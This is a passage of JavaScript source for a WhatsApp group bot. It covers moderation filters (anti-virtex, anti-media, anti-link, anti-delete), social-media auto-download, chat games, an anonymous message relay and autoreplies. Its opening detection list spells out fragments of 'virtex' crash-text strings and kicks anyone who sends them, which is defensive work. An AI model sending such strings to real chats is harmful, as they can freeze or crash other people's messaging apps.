        budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || 
        budy.includes('ผดิทุเ้ึางผืดิทุเ้') || 
        budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || 
        budy.includes('᥋') || 
        budy.includes('؁') || 
        budy.includes('ٯٯٯٯٯ') 
    ) {
        if (m.isBotAdmin) return replygcxlicon('*⚠️ VIRTEX DETECTED*');
        
        console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'));
        
        XliconBotInc.sendText(m.chat, `*📩 MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`);

        if (!m.m.isBotAdmin) return;
        if (XliconTheCreator) return;

        XliconBotInc.groupParticipantsUpdate(m.chat, [sender], 'remove');
        await XliconBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }});

        XliconBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`, {
            text: `👋 Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup ? `in ${groupName}` : ''}`
        });
    }
}
    
  // 🚫 ANTI MEDIA 🚫
if (db.groups[m.chat].antimedia && isMedia) {
    if (XliconTheCreator || m.isAdmin || !m.isBotAdmin) {		  
        // Admins or bot creators are allowed to send media
    } else {
        replygcxlicon(`\`\`\`「 📸 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group.`);
        return XliconBotInc.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: m.key.id, 
                participant: m.key.participant 
            } 
        });
    }
}

     // 🚫 ANTI MEDIA CHECKS 🚫

// 📸 Anti-image
if (db.groups[m.chat].antiimage && isImage) {
    if (!XliconTheCreator && !m.isAdmin && m.isBotAdmin) {
        replygcxlicon(`\`\`\`「 🖼️ Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group.`);
        return XliconBotInc.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: m.key.id, 
                participant: m.key.participant 
            } 
        });
    }
}

// 🎥 Anti-video
if (db.groups[m.chat].antivideo && isVideo) {
    if (!XliconTheCreator && !m.isAdmin && m.isBotAdmin) {
        replygcxlicon(`\`\`\`「 🎬 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group.`);
        return XliconBotInc.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: m.key.id, 
                participant: m.key.participant 
            } 
        });
    }
}

// 🏷️ Anti-sticker
if (db.groups[m.chat].antisticker && isSticker) {
    if (!XliconTheCreator && !m.isAdmin && m.isBotAdmin) {
        replygcxlicon(`\`\`\`「 🏷️ Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group.`);
        return XliconBotInc.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: m.key.id, 
                participant: m.key.participant 
            } 
        });
    }
}

// 🎵 Anti-audio
if (db.groups[m.chat].antiaudio && isAudio) {
    if (!XliconTheCreator && !m.isAdmin && m.isBotAdmin) {
        replygcxlicon(`\`\`\`「 🎧 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group.`);
        return XliconBotInc.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: m.key.id, 
                participant: m.key.participant 
            } 
        });
    }
}

// 📊 Anti-poll
if (db.groups[m.chat].antipoll && type === "pollCreationMessage") {
    if (!XliconTheCreator && !m.isAdmin && m.isBotAdmin) {
        replygcxlicon(`\`\`\`「 📊 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group.`);
        return XliconBotInc.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: m.key.id, 
                participant: m.key.participant 
            } 
        });
    }
}

// 📍 Anti-location
if (db.groups[m.chat].antilocation && isLocation) {
    if (!XliconTheCreator && !m.isAdmin && m.isBotAdmin) {
        replygcxlicon(`\`\`\`「 📍 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group.`);
        return XliconBotInc.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: m.key.id, 
                participant: m.key.participant 
            } 
        });
    }
}

// 📄 Anti-document
if (db.groups[m.chat].antidocument && isDocument) {
    if (!XliconTheCreator && !m.isAdmin && m.isBotAdmin) {
        replygcxlicon(`\`\`\`「 📄 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group.`);
        return XliconBotInc.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: m.key.id, 
                participant: m.key.participant 
            } 
        });
    }
}

// 📞 Anti-contact
if (db.groups[m.chat].anticontact && isContact) {
    if (!XliconTheCreator && !m.isAdmin && m.isBotAdmin) {
        replygcxlicon(`\`\`\`「 📞 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group.`);
        return XliconBotInc.sendMessage(m.chat, { 
            delete: { 
                remoteJid: m.chat, 
                fromMe: false, 
                id: m.key.id, 
                participant: m.key.participant 
            } 
        });
    }
}

// 🔗 Anti-link
if (db.groups[m.chat].antilink) {
    if (budy.match('http') && budy.match('https')) {
        const bvl = `\`\`\`「 🔗 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`;
        if (m.isAdmin || m.key.fromMe || XliconTheCreator) return replygcxlicon(bvl);
        await XliconBotInc.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.key.id,
                participant: m.key.participant
            }
        });
        XliconBotInc.sendMessage(m.chat, {
            text: `\`\`\`「 🔗 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted.`,
            contextInfo: { mentionedJid: [m.sender] },
            quoted: m
        });
    }
}
 
//---------------------------------------------------------------------------------------------------------------------------//

        
// auto download #ctto
// Auto-download feature
if (db.settings[botNumber].autodownload && !m.key.fromMe) {
  try {
    // Check if the message contains an Instagram link
    if (budy.match(`instagram.com`)) {
      await XliconBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

      // Updated Instagram API
      let anu = await fetchJson(`https://bk9.fun/download/instagram2?url=${encodeURIComponent(budy)}`);
      if (anu.status) {
        // Extract the first video or image from the response
        let videoUrl = anu.BK9[0]?.url || "No video found";
        let thumbnail = anu.BK9[0]?.thumbnail;

        // Send the video
        await XliconBotInc.sendMessage(m.chat, {
          video: { url: videoUrl },
          caption: `Auto Download ✅`,
          thumbnail: { url: thumbnail },
        }, { quoted: m });
      } else {
        await XliconBotInc.sendMessage(m.chat, { text: "Failed to fetch Instagram video." }, { quoted: m });
      }
      await XliconBotInc.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

    // Check for TikTok links
    } else if (budy.match(`tiktok.com`)) {
      await XliconBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

      let anu = await fetchJson(`https://bk9.fun/download/tiktok?url=${encodeURIComponent(budy)}`);
      if (anu.status) {
        await XliconBotInc.sendMessage(m.chat, {
          video: { url: anu.BK9.BK9 },
          caption: `Auto Download ✅`
        }, { quoted: m });
      } else {
        await XliconBotInc.sendMessage(m.chat, { text: "Failed to fetch TikTok video." }, { quoted: m });
      }
      await XliconBotInc.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

    // Check for Facebook links
    } else if (budy.match(`facebook.com`)) {
      await XliconBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

      let anu = await fetchJson(`https://bk9.fun/download/fb?url=${encodeURIComponent(budy)}`);
      if (anu.status) {
        await XliconBotInc.sendMessage(m.chat, {
          video: { url: anu.BK9.hd },
          caption: `Auto Download ✅`
        }, { quoted: m });
      } else {
        await XliconBotInc.sendMessage(m.chat, { text: "Failed to fetch Facebook video." }, { quoted: m });
      }
      await XliconBotInc.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

    // Check for YouTube links
    } else if (budy.match(`youtube.com|youtu.be`)) {
      await XliconBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

      let anu = await fetchJson(`https://bk9.fun/download/youtube2?url=${encodeURIComponent(budy)}`);
      if (anu.status) {
        await XliconBotInc.sendMessage(m.chat, {
          video: { url: anu.BK9.BK9 },
          caption: `Auto Download ✅`
        }, { quoted: m });
      } else {
        await XliconBotInc.sendMessage(m.chat, { text: "Failed to fetch YouTube video." }, { quoted: m });
      }
      await XliconBotInc.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });
    }
  } catch (err) {
    console.error(err);
    await XliconBotInc.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
  }
}

//---------------------------------------------------------------------------------------------------------------------------//

// Group Settings
		if (m.isGroup) {
			// Mute
			if (db.groups[m.chat].mute && !XliconTheCreator) {
				return
			}

      
			// Anti Delete
			if (m.type == 'protocolMessage' && db.groups[m.chat].antidelete) {
				const mess = chatUpdate.messages[0].message.protocolMessage
				if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Delete❗*'}, ...chats.key }
					await XliconBotInc.relayMessage(m.chat, { [chats.type]: chats.msg }, {})
				}
			}
		}

//---------------------------------------------------------------------------------------------------------------------------//


		//user db //friend
        if (isCmd && !isUser) {
xliconverifieduser.push(sender)
fs.writeFileSync('./src/user.json', JSON.stringify(xliconverifieduser, null, 2))
}
	
//---------------------------------------------------------------------------------------------------------------------------//



//All games featres here

		// Check Expiry
		prem.expiredCheck(XliconBotInc, premium);
		
		// TicTacToe
let room = Object.values(game.tictactoe).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING');
if (room) {
    let ok;
    let isWin = false;
    let isTie = false;
    let isSurrender = false;

    if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return;

    isSurrender = !/^[1-9]$/.test(m.text);
    if (m.sender !== room.game.currentTurn) {
        if (!isSurrender) return true;
    }

    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
        replygcxlicon({
            '-3': '🚫 The game is over',
            '-2': '❌ Invalid',
            '-1': '⚠️ Invalid Position',
            0: '⚠️ Invalid Position',
        }[ok]);
        return true;
    }

    if (m.sender === room.game.winner) isWin = true;
    else if (room.game.board === 511) isTie = true;

    let arr = room.game.render().map(v => {
        return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
        }[v];
    });

    if (isSurrender) {
        room.game._currentTurn = m.sender === room.game.playerX;
        isWin = true;
    }

    let winner = isSurrender ? room.game.currentTurn : room.game.winner;
    if (isWin) {
        global.db.users[m.sender].limit += 3;
        global.db.users[m.sender].uang += 3000;
    }

    let str = `🏆 *Room ID:* ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\n${isWin ? `🎉 @${winner.split('@')[0]} *Wins!*` : isTie ? `💔 *Game Over*` : `🔄 *Turn* ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}\n❌: @${room.game.playerX.split('@')[0]}\n⭕: @${room.game.playerO.split('@')[0]}\n\n📝 *Type* *surrender* to give up and admit defeat`;

    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat) {
        room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat;
    }

    if (room.x !== room.o) await XliconBotInc.sendMessage(room.x, { text: str, mentions: parseMention(str) }, { quoted: m });
    await XliconBotInc.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m });

    if (isTie || isWin) {
        delete game.tictactoe[room.id];
    }
}

// Suit PvP
let roof = Object.values(game.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender));
if (roof) {
    let win = '';
    let tie = false;

    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
        if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
            replygcxlicon(`🔴 @${roof.p2.split`@`[0]} *rejected the suit*,\n❌ *suit cancelled*`);
            delete game.suit[roof.id];
            return true;
        }
        roof.status = 'play';
        roof.asal = m.chat;
        clearTimeout(roof.waktu);
        replygcxlicon(`🎊 The suit has been sent to chat\n\n👤 @${roof.p.split`@`[0]} and @${roof.p2.split`@`[0]}\n\n✏️ *Please select a suit in the respective chat* https://wa.me/${botNumber.split`@`[0]}`);
        
        if (!roof.pilih) XliconBotInc.sendMessage(roof.p, { text: `🔄 *Please select* \n\n🪨 Rock\n📄 Paper\n✂️ Scissors` }, { quoted: m });
        if (!roof.pilih2) XliconBotInc.sendMessage(roof.p2, { text: `🔄 *Please select* \n\n🪨 Rock\n📄 Paper\n✂️ Scissors` }, { quoted: m });
        
        roof.waktu_milih = setTimeout(() => {
            if (!roof.pilih && !roof.pilih2) replygcxlicon(`🚫 Both players have no intention of playing,\n❌ *Suit cancelled*`);
            else if (!roof.pilih || !roof.pilih2) {
                win = !roof.pilih ? roof.p2 : roof.p;
                replygcxlicon(`❌ @${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} didn't choose a suit, the game ends`);
            }
            delete game.suit[roof.id];
            return true;
        }, roof.timeout);
    }

    let jwb = m.sender == roof.p;
    let jwb2 = m.sender == roof.p2;
    let g = /scissors/i;
    let b = /rock/i;
    let k = /paper/i;
    let reg = /^(scissors|rock|paper)/i;

    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
        roof.pilih = reg.exec(m.text.toLowerCase())[0];
        roof.text = m.text;
        replygcxlicon(`✅ You have chosen *${m.text}* ${!roof.pilih2 ? `\n⏳ Waiting for the opponent to choose` : ''}`);
        if (!roof.pilih2) XliconBotInc.sendMessage(roof.p2, { text: '_The opponent has already chosen_\n⚠️ *Now it is your turn*' });
    }

    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
        roof.pilih2 = reg.exec(m.text.toLowerCase())[0];
        roof.text2 = m.text;
        replygcxlicon(`✅ You have chosen *${m.text}* ${!roof.pilih ? `\n⏳ Waiting for the opponent to choose` : ''}`);
        if (!roof.pilih) XliconBotInc.sendMessage(roof.p, { text: '_The opponent has already chosen_\n⚠️ *Now it is your turn*' });
    }

    let stage = roof.pilih;
    let stage2 = roof.pilih2;

    if (roof.pilih && roof.pilih2) {
        clearTimeout(roof.waktu_milih);
        
        if (b.test(stage) && g.test(stage2)) win = roof.p;
        else if (b.test(stage) && k.test(stage2)) win = roof.p2;
        else if (g.test(stage) && k.test(stage2)) win = roof.p;
        else if (g.test(stage) && b.test(stage2)) win = roof.p2;
        else if (k.test(stage) && b.test(stage2)) win = roof.p;
        else if (k.test(stage) && g.test(stage2)) win = roof.p2;
        else if (stage == stage2) tie = true;

        global.db.users[roof.p == win ? roof.p : roof.p2].limit += tie ? 0 : 3;
        global.db.users[roof.p == win ? roof.p : roof.p2].uang += tie ? 0 : 3000;

        XliconBotInc.sendMessage(roof.asal, { text: `🏆 *Suit Results* ${tie ? '\n🔄 *SERIES*' : ''}\n\n👤 @${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? `🥇 *Win* \n` : `❌ *Lost* \n`}\n👤 @${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? `🥇 *Win* \n` : `❌ *Lost* \n`}\n\n💰 *Winner Gets*\n*Present:* Money (3000) & Limit (3)`.trim(), mentions: [roof.p, roof.p2] }, { quoted: m });

        delete game.suit[roof.id];
    }
}

        // Guess Bomb
		let pilih = '🌀', bomb = '💣';
		if (m.sender in game.tebakbom) {
			if (!/^[1-9]|10$/i.test(body) && !isCmd) return !0;
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 1) return !0;
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 2) {
				game.tebakbom[m.sender].board[parseInt(body) - 1] = bomb;
				game.tebakbom[m.sender].pick++;
				XliconBotInc.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
				game.tebakbom[m.sender].bomb--;
				game.tebakbom[m.sender].nyawa.pop();
				let brd = game.tebakbom[m.sender].board;
				if (game.tebakbom[m.sender].nyawa.length < 1) {
					global.db.users[m.sender].limit -= 1
					await replygcxlicon(`*THE GAME IS OVER*\nYou were hit by a bomb\n\n ${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n_Limit Reduction : 1_`);
					XliconBotInc.sendMessage(m.chat, {react: {text: '😂', key: m.key}})
					delete game.tebakbom[m.sender];
				} else await replygcxlicon(`*SELECT A NUMBER*\n\nYou were hit by a bomb\n ${brd.join('')}\n\nSelected: ${game.tebakbom[m.sender].pick}\nRemaining life: ${game.tebakbom[m.sender].nyawa}`);
				return !0;
			}
			if (game.tebakbom[m.sender].petak[parseInt(body) - 1] === 0) {
				game.tebakbom[m.sender].petak[parseInt(body) - 1] = 1;
				game.tebakbom[m.sender].board[parseInt(body) - 1] = pilih;
				game.tebakbom[m.sender].pick++;
				game.tebakbom[m.sender].lolos--;
				let brd = game.tebakbom[m.sender].board;
				if (game.tebakbom[m.sender].lolos < 1) {
					global.db.users[m.sender].limit += 3
					global.db.users[m.sender].uang += 3000
					await replygcxlicon(`*YOU ARE GREAT ಠ⁠ᴥ⁠ಠ*\n\n${brd.join('')}\n\n*Selected :* ${game.tebakbom[m.sender].pick}\n*Remaining life :* ${game.tebakbom[m.sender].nyawa}\n*Bomb :* ${game.tebakbom[m.sender].bomb}\n*Present :* Money(3000) & Limit(3)`);
					delete game.tebakbom[m.sender];
				} else replygcxlicon(`*SELECT A NUMBER*\n\n${brd.join('')}\n\nSelected : ${game.tebakbom[m.sender].pick}\nRemaining life : ${game.tebakbom[m.sender].nyawa}\nBomb : ${game.tebakbom[m.sender].bomb}`)
			}
		}
		
		// Math
		if (game.kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
			kuis = true
			jawaban = game.kuismath[m.sender.split('@')[0]].jawaban
			const difficultyMap = { 'noob': 1, 'easy': 2, 'medium': 3, 'hard': 4, 'extreme': 5, 'impossible': 6, 'impossible2': 7 };
			let hasilLimit = difficultyMap[game.kuismath[m.sender.split('@')[0]].mode]
			if (isNaN(budy)) return
			if (budy.toLowerCase() == jawaban) {
				global.db.users[m.sender].limit += hasilLimit
				global.db.users[m.sender].uang += hasilLimit * 1000
				await replygcxlicon(`🎮 Math Quiz  🎮\n\nCorrect answer 🎉\nYou Get a Limit *${hasilLimit}*\n\nWant to play again? Send ${prefix}math mode`)
				delete game.kuismath[m.sender.split('@')[0]]
			} else replygcxlicon('*Wrong answer!*')
		}
		
		// Menfes
		if (!m.isGroup) {
			if (game.menfes[m.sender] && m.key.remoteJid !== 'status@broadcast') {
				if (!/^del(menfe(s|ss)|confe(s|ss))$/i.test(command)) {
					m.msg.contextInfo = { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Order From ${game.menfes[m.sender].nama ? game.menfes[m.sender].nama : 'Somebody'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}
					const pesan = m.type === 'conversation' ? { extendedTextMessage: { text: m.msg, contextInfo: { isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: `*Order From ${game.menfes[m.sender].nama ? game.menfes[m.sender].nama : 'Somebody'}*`}, key: { remoteJid: '0@s.whatsapp.net', fromMe: false, participant: '0@s.whatsapp.net' }}}} : { [m.type]: m.msg }
					await XliconBotInc.relayMessage(game.menfes[m.sender].tujuan, pesan, {});
				}
			}
		}



//game features end here    
//---------------------------------------------------------------------------------------------------------------------------//




//reply features
		// AFK
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])];
for (let jid of mentionUser) {
    let user = global.db.users[jid];
    if (!user) continue;
    let afkTime = user.afkTime;
    if (!afkTime || afkTime < 0) continue;
    let reason = user.afkReason || '';
    replygcxlicon(`🚫 *Don't tag him!*\n🕒 He's AFK ${reason ? 'with reason: *' + reason + '*' : '*with no reason*'}\n⏳ During: *${clockString(new Date - afkTime)}*`.trim());
}
if (global.db.users[m.sender].afkTime > -1) {
    let user = global.db.users[m.sender];
    replygcxlicon(`✅ @${m.sender.split('@')[0]} *berhenti AFK*${user.afkReason ? ' *after* ' + user.afkReason : ''}\n⏳ During: *${clockString(new Date - user.afkTime)}*`);
    user.afkTime = -1;
    user.afkReason = '';
}



		//reply
        async function replygcxlicon(teks) {
            if (typereply === 'v1') {
               m.reply(teks)

            } else if (typereply === 'v2') {
                XliconBotInc.sendMessage(m.chat, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            previewType: "PHOTO",
                            thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
                            sourceUrl: wagc
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                });

            } else if (typereply === 'v3') {
               XliconBotInc.sendMessage(m.chat, {
                  text: teks,
                  contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: ownername,
                        thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
                        sourceUrl: websitex,
                        mediaType: 1,
                        renderLargerThumbnail: true
                     }
                  }
               }, { quoted: m })

            } else if (typereply === 'v4') {
                replygcxlicon2(teks)
            }
        }

        
//fake reply with channel link embedded
async function replygcxlicon2(txt) {
const xliconnewrep = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "🇪 🇸  🇹 🇪 🇦 🇲 🇸 ",
newsletterJid: "120363313305181359@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: ownername,
thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
sourceUrl: websitex
},
},
text: txt,
}
return XliconBotInc.sendMessage(m.chat, xliconnewrep, {
quoted: m,
})
}

//---------------------------------------------------------------------------------------------------------------------------//

//premium
        async function replyprem(teks) {
    replygcxlicon(`🚨 *This feature is for premium users only!*\n💬 *Contact the ES TEAMS TECH* to become a premium user!`);
}


//script replier
        async function sendXliconBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await XliconBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
//---------------------------------------------------------------------------------------------------------------------------//


//theme sticker reply
        const XliconStickWait = () => {
        let XliconStikRep = fs.readFileSync('./ES_TEAMS-MEDIA/theme/sticker_reply/wait.webp')
        XliconBotInc.sendMessage(m.chat, { sticker: XliconStikRep }, { quoted: m })
        }
        const XliconStickAdmin = () => {
        let XliconStikRep = fs.readFileSync('./ES_TEAMS-MEDIA/theme/sticker_reply/ES_TEAMS-TECH.webp')
        XliconBotInc.sendMessage(m.chat, { sticker: XliconStikRep }, { quoted: m })
        }
        const XliconStickBotAdmin = () => {
        let XliconStikRep = fs.readFileSync('./ES_TEAMS-MEDIA/theme/sticker_reply/ES_TEAMS-TECH.webp')
        XliconBotInc.sendMessage(m.chat, { sticker: XliconStikRep }, { quoted: m })
        }
        const XliconStickOwner = () => {
        let XliconStikRep = fs.readFileSync('./ES_TEAMS-MEDIA/theme/sticker_reply/ES_TEAMS.webp')
        XliconBotInc.sendMessage(m.chat, { sticker: XliconStikRep }, { quoted: m })
        }
        const XliconStickGroup = () => {
        let XliconStikRep = fs.readFileSync('./ES_TEAMS-MEDIA/theme/sticker_reply/PASCHAL.webp')
        XliconBotInc.sendMessage(m.chat, { sticker: XliconStikRep }, { quoted: m })
        }
        const XliconStickPrivate = () => {
        let XliconStikRep = fs.readFileSync('./ES_TEAMS-MEDIA/theme/sticker_reply/PASCHAL_MEDIA.webp')
        XliconBotInc.sendMessage(m.chat, { sticker: XliconStikRep }, { quoted: m })
        }
  
//theme sticker reply end here        
//---------------------------------------------------------------------------------------------------------------------------//


//time
const xday = moment.tz('Asia/Karachi').locale('en-IN').format('dddd');
const xdate = moment.tz('Asia/Karachi').locale('en-IN').format('DD/MM/YYYY');
const xtime = moment().tz('Asia/Karachi').locale('en-IN').format('HH:mm:ss');
const time2 = moment().tz('Asia/Karachi').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var xliconytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xliconytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xliconytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xliconytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xliconytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xliconytimewisher = `Good Morning 🌄`
 } 

//---------------------------------------------------------------------------------------------------------------------------//

//theme txt
let setv = pickRandom(global.listv)

//autoreply
for (let BhosdikaXlicon of VoiceNoteXlicon) {
if (budy === BhosdikaXlicon) {
let audiobuffy = fs.readFileSync(`./ES_TEAMS-MEDIA/audio/${BhosdikaXlicon}.mp3`)
XliconBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXlicon of StickerXlicon){
if (budy === BhosdikaXlicon){
let stickerbuffy = fs.readFileSync(`./ES_TEAMS-MEDIA/sticker/${BhosdikaXlicon}.webp`)
XliconBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXlicon of ImageXlicon){
if (budy === BhosdikaXlicon){
let imagebuffy = fs.readFileSync(`./ES_TEAMS-MEDIA/image/${BhosdikaXlicon}.jpg`)
XliconBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXlicon of VideoXlicon){
if (budy === BhosdikaXlicon){
